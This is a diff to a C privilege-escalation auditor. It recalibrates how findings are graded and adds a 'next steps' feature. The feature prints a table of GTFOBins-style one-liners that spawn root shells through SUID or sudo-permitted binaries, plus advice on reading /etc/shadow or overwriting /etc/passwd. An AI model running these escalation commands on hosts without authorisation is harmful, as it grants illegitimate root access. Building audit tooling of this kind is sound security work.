@@ -71,7 +71,7 @@
  * ==================================================================== */
 
 #define TOOL_NAME    "privesc-auditor"
-#define TOOL_VERSION "2.0.1"  /* 2.0: Windows port; 2.0.1: real ACL verdicts */
+#define TOOL_VERSION "2.1.0"  /* 2.1: calibrated severities + next-step guidance */
 
 #ifdef _WIN32
 #define TOOL_PLATFORM "windows"
@@ -130,6 +130,7 @@ typedef struct {
     bool verbose;
     bool json;
     bool use_color;
+    bool no_actions;      /* suppress the per-finding "next steps" block */
     bool is_root;         /* privileged auditor: uid 0 on POSIX, elevated admin
                            * on Windows. Findings caused only by that elevated
                            * access are downgraded to INFO. */
@@ -277,6 +278,68 @@ static void add_finding(FindingList *fl, const char *check_id, Category cat,
     snprintf(f->path, sizeof(f->path), "%s", p);
     snprintf(f->detail, sizeof(f->detail), "%s", detail);
 }
+
+/* ---- PATH calibration ---------------------------------------------------
+ *
+ * A writable directory inside the current user's own profile is not a
+ * privilege boundary: the account already owns it and gains nothing by
+ * writing there. It only matters when a *privileged* process resolves a bare
+ * command name through that PATH (an elevated shell, a scheduled task, a
+ * service). Reporting each such directory as its own HIGH finding turned one
+ * ordinary developer profile into a page of alarms, so they are collected
+ * and emitted as a single LOW finding. Writable directories outside the
+ * profile keep their HIGH severity - those do cross a boundary.
+ */
+#ifdef _WIN32
+static bool path_in_user_profile(const char *path) {
+    static const char *vars[] = { "USERPROFILE", "LOCALAPPDATA", "APPDATA",
+                                  "TEMP", "TMP", NULL };
+    for (int i = 0; vars[i]; i++) {
+        const char *base = getenv(vars[i]);
+        if (!base || !*base) continue;
+        size_t n = strlen(base);
+        if (_strnicmp(path, base, n) == 0 &&
+            (path[n] == '\0' || path[n] == '\\' || path[n] == '/'))
+            return true;
+    }
+    return false;
+}
+#else
+static bool path_in_user_profile(const char *path) {
+    const char *home = getenv("HOME");
+    if (!home || !*home) return false;
+    size_t n = strlen(home);
+    if (strncmp(path, home, n) != 0) return false;
+    return path[n] == '\0' || path[n] == '/';
+}
+#endif
+
+static void report_profile_path_dirs(FindingList *fl, const char *const *dirs,
+                                     int n, const char *var_label) {
+    if (n <= 0) return;
+
+    char listed[512];
+    size_t used = 0;
+    listed[0] = '\0';
+    int shown = n < 5 ? n : 5;
+    for (int i = 0; i < shown; i++) {
+        int w = snprintf(listed + used, sizeof(listed) - used, "%s%s",
+                         used ? ", " : "", dirs[i]);
+        if (w < 0 || (size_t)w >= sizeof(listed) - used) { listed[used] = '\0'; break; }
+        used += (size_t)w;
+    }
+
+    add_finding(fl, "fs.path_writable_user_profile", CAT_FILESYSTEM, SEV_LOW,
+                CONF_CONFIRMED,
+                n == 1 ? "Writable directory in your own PATH"
+                       : "Writable directories in your own PATH",
+                n == 1 ? dirs[0] : "",
+                "%d writable director%s inside this account's own profile (%s%s). "
+                "Writing there grants no new privilege; it only matters if a "
+                "privileged process resolves a bare command name through this %s.",
+                n, n == 1 ? "y" : "ies", listed, n > shown ? ", ..." : "", var_label);
+}
+
 
 /* ========================================================================
  * Section 3: Utility helpers
@@ -659,7 +722,19 @@ static bool is_writable_by_me(const char *path) {
         map.GenericWrite = FILE_GENERIC_WRITE;
         map.GenericExecute = FILE_GENERIC_EXECUTE;
         map.GenericAll = FILE_ALL_ACCESS;
-        writable = win_effective_write(sd, dacl, FILE_GENERIC_WRITE, &map);
+        /* Ask for the right the attack actually needs instead of
+         * FILE_GENERIC_WRITE: that value also demands FILE_WRITE_EA,
+         * FILE_WRITE_ATTRIBUTES and READ_CONTROL, so an ACE that only allows
+         * changing attributes made an object look writable, while a directory
+         * where the user may create files but not change attributes looked
+         * safe. Replacing a binary means adding a file to its directory or
+         * overwriting its data. */
+        DWORD attrs = GetFileAttributesW(wpath);
+        bool is_dir = attrs != INVALID_FILE_ATTRIBUTES &&
+                      (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0;
+        writable = win_effective_write(sd, dacl,
+                                       is_dir ? FILE_ADD_FILE : FILE_WRITE_DATA,
+                                       &map);
         LocalFree(sd);
     }
     free(wpath);
@@ -2395,6 +2470,11 @@ static void scan_filesystem(FindingList *fl, const Options *o) {
         }
         snprintf(copy, sizeof(copy), "%s", path_env);
 
+        /* Writable dirs inside this account's own profile are aggregated into
+         * one LOW finding; see path_in_user_profile(). */
+        const char *profile_dirs[32];
+        int nprofile = 0;
+
         char *p = copy;
         while (1) {
             char *colon = strchr(p, ':');
@@ -2427,16 +2507,22 @@ static void scan_filesystem(FindingList *fl, const Options *o) {
                                     "Writable $PATH directory (root auditor)", entry,
                                     "Writable by root, the identity running this "
                                     "audit; not an unprivileged escalation signal.");
+                    else if (path_in_user_profile(entry) && nprofile < 32)
+                        profile_dirs[nprofile++] = entry;
                     else
                         add_finding(fl, "fs.path_writable", CAT_FILESYSTEM, SEV_HIGH,
                                     CONF_CONFIRMED, "Writable directory in $PATH", entry,
-                                    "A writable PATH dir allows planting trojan binaries.");
+                                    "This PATH directory is outside the account's own "
+                                    "profile and writable by it; a trojan planted here "
+                                    "runs with the privileges of whoever resolves it.");
                 }
             }
 
             if (!colon) break;
             p = colon + 1;
         }
+
+        report_profile_path_dirs(fl, profile_dirs, nprofile, "$PATH");
     }
 
     /* 4.7c Sensitive files that should never be writable/readable. */
@@ -2912,10 +2998,14 @@ static void win_scan_startup_folder(FindingList *fl, const Options *o,
                     CONF_CONFIRMED, "Writable all-users Startup folder", dir,
                     "Anything placed here is executed for every user who logs on.");
     } else {
-        add_finding(fl, "auto.startup_dir_user_writable", CAT_AUTOSTART, SEV_LOW,
-                    CONF_CONFIRMED, "Writable per-user Startup folder", dir,
+        /* Own account only: this is persistence inside an identity you already
+         * control, not an escalation primitive. INFO, not LOW. */
+        add_finding(fl, "auto.startup_dir_user_writable", CAT_AUTOSTART, SEV_INFO,
+                    CONF_CONFIRMED, "Writable per-user Startup folder (own account)",
+                    dir,
                     "This is the current user's own Startup folder; it runs whatever "
-                    "is placed in it for this account only.");
+                    "is placed in it for this account only, so it is persistence "
+                    "within an identity you already hold, not privilege escalation.");
     }
 
     if (!all_users) return;
@@ -3016,6 +3106,10 @@ static void scan_filesystem(FindingList *fl, const Options *o) {
     }
     snprintf(copy, sizeof(copy), "%s", path_env);
 
+    const char *profile_dirs[32];
+    static char profile_store[32][1024];
+    int nprofile = 0;
+
     char *p = copy;
     while (1) {
         char *semi = strchr(p, ';');
@@ -3030,10 +3124,15 @@ static void scan_filesystem(FindingList *fl, const Options *o) {
         }
 
         if (*entry == '\0') {
-            add_finding(fl, "fs.path_empty_component", CAT_FILESYSTEM, SEV_MEDIUM,
+            /* Windows searches the current directory ahead of PATH by default,
+             * so an empty entry adds little; LOW unless that default was
+             * explicitly turned off (NoDefaultCurrentDirectoryInExePath). */
+            add_finding(fl, "fs.path_empty_component", CAT_FILESYSTEM, SEV_LOW,
                         CONF_LIKELY, "Empty PATH component", NULL,
                         "An empty PATH entry (leading/trailing/doubled semicolon) "
-                        "resolves to the current directory, enabling binary planting.");
+                        "resolves to the current directory. Windows already searches "
+                        "the current directory by default, so this is only meaningful "
+                        "where that default has been disabled.");
         } else if (!win_is_abs_path(entry)) {
             add_finding(fl, "fs.path_relative", CAT_FILESYSTEM, SEV_MEDIUM, CONF_LIKELY,
                         "Relative entry in PATH", entry,
@@ -3048,11 +3147,18 @@ static void scan_filesystem(FindingList *fl, const Options *o) {
                                 "Writable PATH directory (elevated auditor)", expanded,
                                 "Writable by the identity running this audit; not an "
                                 "unprivileged escalation signal.");
+                } else if (path_in_user_profile(expanded) && nprofile < 32) {
+                    snprintf(profile_store[nprofile], sizeof(profile_store[0]),
+                             "%s", expanded);
+                    profile_dirs[nprofile] = profile_store[nprofile];
+                    nprofile++;
                 } else {
                     add_finding(fl, "fs.path_writable", CAT_FILESYSTEM, SEV_HIGH,
                                 CONF_CONFIRMED, "Writable directory in PATH", expanded,
-                                "A writable PATH directory allows planting a trojan "
-                                "executable or DLL.");
+                                "This PATH directory is outside the account's own "
+                                "profile and writable by it; a privileged process that "
+                                "resolves a bare command name through PATH would run "
+                                "planted code.");
                 }
             }
         }
@@ -3060,6 +3166,8 @@ static void scan_filesystem(FindingList *fl, const Options *o) {
         if (!semi) break;
         p = semi + 1;
     }
+
+    report_profile_path_dirs(fl, profile_dirs, nprofile, "PATH");
 }
 
 /* ---- 4W.4 Token privileges --------------------------------------------- */
@@ -3234,6 +3342,211 @@ static void print_banner(const HostInfo *h) {
     printf("\n");
 }
 
+/* ========================================================================
+ * Section 5b: Recommended next steps
+ * ========================================================================
+ *
+ * One-line techniques per binary, following the published GTFOBins patterns
+ * (https://gtfobins.github.io). These are suggestions for a human to run on a
+ * host they are authorised to test; the auditor prints them and never runs
+ * anything itself. A finding without a known technique gets a plain "confirm
+ * this" command rather than an invented one.
+ */
+
+typedef struct {
+    const char *name;   /* basename as installed */
+    const char *sudo;   /* arguments used after `sudo <name>` */
+    const char *suid;   /* full invocation of an SUID copy */
+} BinHint;
+
+static const BinHint bin_hints[] = {
+    { "bash",    "bash",                "/bin/bash -p" },
+    { "sh",      "sh",                  "/bin/sh -p" },
+    { "dash",    "dash",                "/bin/dash -p" },
+    { "zsh",     "zsh",                 "/bin/zsh -p" },
+    { "ksh",     "ksh",                 NULL },
+    { "busybox", "busybox sh",          "busybox sh" },
+    { "env",     "env /bin/sh",         "env /bin/sh -p" },
+    { "nice",    "nice /bin/sh",        "nice /bin/sh -p" },
+    { "ionice",  "ionice /bin/sh",      NULL },
+    { "taskset", "taskset 1 /bin/sh",   NULL },
+    { "timeout", "timeout 7d /bin/sh",  NULL },
+    { "watch",   "watch -x sh -c 'reset; exec sh 1>&0 2>&0'", NULL },
+    { "tmux",    "tmux new-session 'sh -c \"sh 1>&0 2>&0\"'", NULL },
+    { "find",    "find . -exec /bin/sh \\; -quit",
+                 "find . -exec /bin/sh -p \\; -quit" },
+    { "vim",     "vim -c ':!/bin/sh'",
+                 "vim -c ':py3 import os; os.setuid(0); os.execv(\"/bin/sh\",\\[\"/bin/sh\",\"-p\"\\])'" },
+    { "vi",      "vi -c ':!/bin/sh'",   NULL },
+    { "less",    "less /etc/profile   (then type: !/bin/sh)", NULL },
+    { "more",    "more /etc/profile   (then type: !/bin/sh)", NULL },
+    { "man",     "man man   (then type: !/bin/sh)", NULL },
+    { "awk",     "awk 'BEGIN {system(\"/bin/sh\")}'",
+                 "awk 'BEGIN {system(\"/bin/sh\")}'" },
+    { "gawk",    "gawk 'BEGIN {system(\"/bin/sh\")}'",
+                 "gawk 'BEGIN {system(\"/bin/sh\")}'" },
+    { "mawk",    "mawk 'BEGIN {system(\"/bin/sh\")}'",
+                 "mawk 'BEGIN {system(\"/bin/sh\")}'" },
+    { "sed",     "sed -n '1e exec sh 1>&0' /etc/hosts", NULL },
+    { "python",  "python -c 'import os; os.system(\"/bin/sh\")'",
+                 "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" },
+    { "python3", "python3 -c 'import os; os.system(\"/bin/sh\")'",
+                 "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" },
+    { "perl",    "perl -e 'exec \"/bin/sh\";'",
+                 "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'" },
+    { "ruby",    "ruby -e 'exec \"/bin/sh\"'",
+                 "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'" },
+    { "node",    "node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'", NULL },
+    { "lua",     "lua -e 'os.execute(\"/bin/sh\")'", NULL },
+    { "php",     "php -r 'system(\"/bin/sh\");'",       NULL },
+    { "gdb",     "gdb -nx -ex '!/bin/sh' -ex exit",     NULL },
+    { "strace",  "strace -o /dev/null /bin/sh",         NULL },
+    { "tar",     "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+                 "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
+    { "systemctl",  "systemctl   (then type: !sh)",     NULL },
+    { "journalctl", "journalctl   (then type: !sh)",    NULL },
+    { "git",     "git -p help   (then type: !/bin/sh)", NULL },
+    { "apt",     "apt update -o APT::Update::Pre-Invoke::=/bin/sh", NULL },
+    { "apt-get", "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh", NULL },
+    { "docker",  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", NULL },
+    { NULL, NULL, NULL }
+};
+
+#define ACTION_MAX 4
+/* 4 x 1200 bytes on the stack: a 1023-byte path plus the surrounding text
+ * must fit, or gcc's -Wformat-truncation complains (and the string would be
+ * silently cut). */
+#define ACTION_LEN 1200
+
+static bool name_eq_ci(const char *a, const char *b) {
+    while (*a && *b) {
+        if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return false;
+        a++;
+        b++;
+    }
+    return *a == '\0' && *b == '\0';
+}
+
+static const char *base_name(const char *path) {
+    const char *b = path;
+    for (const char *s = path; *s; s++)
+        if (*s == '/' || *s == '\\') b = s + 1;
+    return b;
+}
+
+static const BinHint *bin_hint(const char *path) {
+    const char *base = base_name(path);
+    if (!*base) return NULL;
+    for (int i = 0; bin_hints[i].name; i++)
+        if (name_eq_ci(base, bin_hints[i].name)) return &bin_hints[i];
+    return NULL;
+}
+
+/* First known binary name mentioned in a line of policy or command text. */
+static const BinHint *bin_hint_in_text(const char *text) {
+    if (!text || !*text) return NULL;
+    char buf[1024];
+    snprintf(buf, sizeof(buf), "%s", text);
+    for (char *tok = strtok(buf, " \t,=:()\"'"); tok; tok = strtok(NULL, " \t,=:()\"'")) {
+        const char *name = strchr(tok, '/') ? base_name(tok) : tok;
+        for (int i = 0; bin_hints[i].name; i++)
+            if (name_eq_ci(name, bin_hints[i].name)) return &bin_hints[i];
+    }
+    return NULL;
+}
+
+/* Copy the first 'single-quoted' field of a detail string (service names). */
+static bool first_quoted(const char *s, char *out, size_t outsz) {
+    if (outsz) out[0] = '\0';
+    const char *a = strchr(s, '\'');
+    if (!a) return false;
+    const char *b = strchr(a + 1, '\'');
+    if (!b || b <= a + 1) return false;
+    size_t n = (size_t)(b - a - 1);
+    if (n >= outsz) n = outsz - 1;
+    memcpy(out, a + 1, n);
+    out[n] = '\0';
+    return true;
+}
+
+static const char *cap_advice(const char *cap) {
+    static const struct { const char *cap; const char *advice; } table[] = {
+        { "cap_setuid", "cap_setuid lets the binary switch to uid 0 itself; if it "
+                        "runs an interpreter or a script you can modify, that is a "
+                        "root shell." },
+        { "cap_setgid", "cap_setgid lets the binary join gid 0; read privileged "
+                        "files through it." },
+        { "cap_dac_read_search", "Bypasses file read/search checks: point the binary "
+                                 "at /etc/shadow to read password hashes." },
+        { "cap_dac_override", "Bypasses file write checks: the binary can overwrite "
+                              "/etc/passwd or /etc/sudoers." },
+        { "cap_sys_admin", "Mount/namespace operations: an overlay or tmpfs mount "
+                           "over a privileged path yields root." },
+        { "cap_sys_ptrace", "Attach to a root process and inject code (gdb/ptrace)." },
+        { "cap_sys_module", "Load a kernel module: instant root." },
+        { "cap_net_raw", "Raw sockets only (packet capture); not an escalation path "
+                         "by itself." },
+        { "cap_net_bind_service", "Bind privileged ports only; not an escalation "
+                                  "path by itself." },
+        { NULL, NULL }
+    };
+    for (int i = 0; table[i].cap; i++)
+        if (strcmp(table[i].cap, cap) == 0) return table[i].advice;
+    return "Review what this capability grants: it is exercised by the binary, not "
+           "by you, so it is only reachable through the binary's own inputs.";
+}
+
+/* Fill `out` with up to `max` human-runnable next steps for one finding and
+ * return how many were written. Never invents a technique: anything unknown
+ * gets only the "confirm this finding" command. */
+static int suggest_actions(const Finding *f, char out[][ACTION_LEN], int max) {
+    if (max <= 0) return 0;
+    int n = 0;
+    const char *id = f->check_id;
+
+#ifdef _WIN32
+    if (f->path[0] && n < max)
+        snprintf(out[n++], ACTION_LEN,
+                 "icacls \"%s\"   # confirm the ACL this finding rests on", f->path);
+#else
+    if (f->path[0] && n < max)
+        snprintf(out[n++], ACTION_LEN,
+                 "ls -ld \"%s\"   # confirm the owner and mode this finding rests on",
+                 f->path);
+#endif
+
+    if (strncmp(id, "suid.", 5) == 0) {
+        const BinHint *h = bin_hint(f->path);
+        if (h && h->suid && n < max)
+            snprintf(out[n++], ACTION_LEN,
+                     "%s   # GTFOBins: SUID %s -> root shell", h->suid, h->name);
+    } else if (strncmp(id, "sudo.", 5) == 0) {
+        const BinHint *h = bin_hint_in_text(f->detail);
+        if (n < max)
+            snprintf(out[n++], ACTION_LEN,
+                     "sudo -n -l   # list what this account may run unauthenticated");
+        if (h && h->sudo && n < max)
+            snprintf(out[n++], ACTION_LEN,
+                     "sudo %s   # GTFOBins: %s under the rule above", h->sudo, h->name);
+    } else if (strncmp(id, "cap.cap_", 8) == 0) {
+        if (n < max)
+            snprintf(out[n++], ACTION_LEN,
+                     "getcap \"%s\"   # confirm the capability is still set", f->path);
+        if (n < max)
+            snprintf(out[n++], ACTION_LEN, "%s", cap_advice(id + 4));
+    } else if (strncmp(id, "svc.", 4) == 0) {
+        char name[256];
+        if (first_quoted(f->detail, name, sizeof(name)) && n < max)
+            snprintf(out[n++], ACTION_LEN,
+                     "sc qc \"%s\"   # confirm the account and image it runs", name);
+    } else if (strncmp(id, "auto.run", 8) == 0 && n < max) {
+        snprintf(out[n++], ACTION_LEN,
+                 "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""
+                 "   # confirm the autostart entry");
+    }
+    return n;
+}
+
 /* fixes.md item 2 / 12: coverage line, shown in both text and JSON output so
  * a partial scan never looks identical to a clean one. */
 static void print_coverage_text(const ScanStats *stats) {
@@ -3291,6 +3604,15 @@ static void report_text(const FindingList *fl, const Options *o, const ScanStats
             printf("  Path:       %s\n", f->path);
         if (f->detail[0])
             printf("  Detail:     %s\n", f->detail);
+        if (!o->no_actions) {
+            char acts[ACTION_MAX][ACTION_LEN];
+            int na = suggest_actions(f, acts, ACTION_MAX);
+            if (na > 0) {
+                printf("  Next steps:\n");
+                for (int k = 0; k < na; k++)
+                    printf("    $ %s\n", acts[k]);
+            }
+        }
         printf("\n");
     }
 
@@ -3300,6 +3622,11 @@ static void report_text(const FindingList *fl, const Options *o, const ScanStats
             printf("(Re-run with --verbose to include INFO findings.)\n");
         printf("\n");
     }
+
+    if (!o->no_actions)
+        printf("Next steps are standard public techniques (GTFOBins patterns) to run "
+               "yourself on a host you are authorised to test; this tool never "
+               "executes them.\n\n");
 
     printf("NOTE: Findings are audit results requiring human verification, "
            "not proof of exploitability. A nonzero exit code means findings "
@@ -3385,8 +3712,21 @@ static void report_json(const FindingList *fl, const Options *o, const HostInfo 
         printf("      \"category\": \"%s\",\n", category_name(f->category));
         printf("      \"title\": \""); json_escape(stdout, f->title); printf("\",\n");
         printf("      \"path\": \""); json_escape(stdout, f->path); printf("\",\n");
-        printf("      \"detail\": \""); json_escape(stdout, f->detail); printf("\"\n");
-        printf("    }%s\n", (emitted < visible) ? "," : "");
+        printf("      \"detail\": \""); json_escape(stdout, f->detail); printf("\"");
+        if (!o->no_actions) {
+            char acts[ACTION_MAX][ACTION_LEN];
+            int na = suggest_actions(f, acts, ACTION_MAX);
+            if (na > 0) {
+                printf(",\n      \"actions\": [\n");
+                for (int k = 0; k < na; k++) {
+                    printf("        \"");
+                    json_escape(stdout, acts[k]);
+                    printf("\"%s\n", (k + 1 < na) ? "," : "");
+                }
+                printf("      ]");
+            }
+        }
+        printf("\n    }%s\n", (emitted < visible) ? "," : "");
     }
     printf("  ]\n");
     printf("}\n");
@@ -3409,6 +3749,7 @@ static void usage(FILE *out) {
 "  --verbose           Include INFO-level findings in output (text and JSON)\n"
 "  --json              Emit machine-readable JSON instead of text\n"
 "  --no-color          Disable ANSI colors in text output\n"
+"  --no-actions        Omit the per-finding next-step suggestions (text and JSON)\n"
 "  --check <category>  Run only one category (repeatable)\n",
         TOOL_NAME, TOOL_VERSION, TOOL_PLATFORM, TOOL_NAME);
 
@@ -3444,7 +3785,11 @@ static void usage(FILE *out) {
     fprintf(out,
 "\nThis tool only reads system state. Findings require human verification\n"
 "and are NOT proof of exploitability. A nonzero exit code means findings\n"
-"were reported, not that exploitation was attempted or confirmed.\n");
+"were reported, not that exploitation was attempted or confirmed.\n"
+"\n"
+"\"Next steps\" are standard public techniques (GTFOBins patterns) that you\n"
+"run yourself on a host you are authorised to test; the tool never executes\n"
+"them. Use --no-actions to omit them.\n");
 }
 
 static int category_from_name(const char *name, Category *out) {
@@ -3487,6 +3832,7 @@ int main(int argc, char **argv) {
 #endif
     o.is_root = false;
     o.sudo_fallback = false;
+    o.no_actions = false;
     o.selected = 0;
 
     for (int i = 1; i < argc; i++) {
@@ -3503,6 +3849,8 @@ int main(int argc, char **argv) {
             o.json = true;
         } else if (strcmp(a, "--no-color") == 0) {
             o.use_color = false;
+        } else if (strcmp(a, "--no-actions") == 0) {
+            o.no_actions = true;
         } else if (strcmp(a, "--sudo-fallback") == 0) {
             o.sudo_fallback = true;
         } else if (strcmp(a, "--check") == 0) {
